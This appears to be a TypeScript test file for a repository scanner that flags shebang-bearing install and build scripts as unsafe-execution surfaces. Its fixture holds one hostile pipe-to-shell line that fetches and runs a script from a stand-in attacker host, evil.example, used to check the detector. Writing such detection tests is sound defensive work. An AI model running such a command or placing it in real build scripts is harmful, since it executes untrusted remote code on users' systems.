import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a script that declares an interpreter is scanned as an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. A file whose
  // first two bytes are `#!` runs through that interpreter whatever it is
  // called, so `configure` and other extensionless build scripts execute at
  // build or install time.
  for (const path of ["configure", "scripts/run", "tools/wrapper.in"]) {
    expect({ path, nameOnly: surfacesOf(path) }).toEqual({
      path,
      nameOnly: [],
    });
    const inspection = inspected(path, `#!/bin/sh\nset -eu\n${PAYLOAD}\n`);
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("only an interpreter line on the first bytes adds a surface", () => {
  // `#` alone, and `#!` anywhere but the first two bytes, are not shebangs.
  for (const text of [
    `# configure\n${PAYLOAD}\n`,
    `\n#!/bin/sh\n${PAYLOAD}\n`,
  ]) {
    const inspection = inspected("configure", text);
    expect(inspection.findings).toEqual([]);
    expect(inspection.coverage.installScripts).toEqual({
      state: "complete",
      items: 0,
    });
  }
  // A document with no interpreter line keeps no surface, so the inventory
  // does not become a blanket text scan.
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(inspected("LICENSE", "# License\n").findings).toEqual([]);
});

test("changing an interpreter script changes the reviewed inventory", () => {
  const before = inspected("configure", "#!/bin/sh\nexit 0\n");
  const after = inspected("configure", "#!/bin/sh\nset -eu\nexit 0\n");
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});
